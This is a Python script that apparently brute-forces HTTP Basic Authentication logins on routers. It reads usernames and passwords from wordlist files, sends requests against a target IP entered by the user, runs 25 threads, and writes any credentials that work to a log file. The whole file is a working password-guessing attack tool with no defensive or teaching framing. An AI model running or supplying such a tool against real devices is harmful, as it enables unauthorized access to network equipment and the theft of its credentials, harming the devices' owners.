#coding:utf-8-

import base64
import urllib.request
import urllib.error
import queue
import threading,re,sys
queue = queue.Queue()

class Rout_thread(threading.Thread):

  def __init__(self,queue,passwd):
    threading.Thread.__init__(self)
    self._queue=queue
    self._passwordlist=passwd
  
  def run(self):
    global correct
    if correct==False:
        if self._queue.qsize()>0:
            user=self._queue.get()
            for passwd in self._passwordlist:
                request = urllib.request.Request("http://"+target)
                psw_base64 = "Basic " + base64.b64encode((user + ":" + passwd).encode('utf-8')).decode('utf-8')
                request.add_header('Authorization', psw_base64)
                try:
                    response = urllib.request.urlopen(request)
                    print ("[+]Correct! user: %s, password: %s" % (user,passwd))
                    fp3 = open('log.txt','a')
                    fp3.write(user+':'+passwd+'\n')
                    fp3.close()
                    correct=True
                    break
                except urllib.request.HTTPError:
                    print ("[-]user:%s password:%s Error!" % (user,passwd))
        else:
            pass
    else:
        pass

if __name__ == '__main__':
    correct=False
    passwordlist = []
    line = 25
    threads = []
    target = input("input ip:")
    fp =open("user.txt")
    fp2=open("passwd.txt")
    for user in fp.readlines():
        queue.put(user.split('\n')[0])
        for passwd in fp2.readlines():
            passwordlist.append(passwd.split('\n')[0])
            #print (passwordlist)
    fp.close()
    fp2.close()
    for i in range(line):
        thread = Rout_thread(queue,passwordlist)
        thread.start()
        threads.append(thread)
    for th in threads:
        th.join()
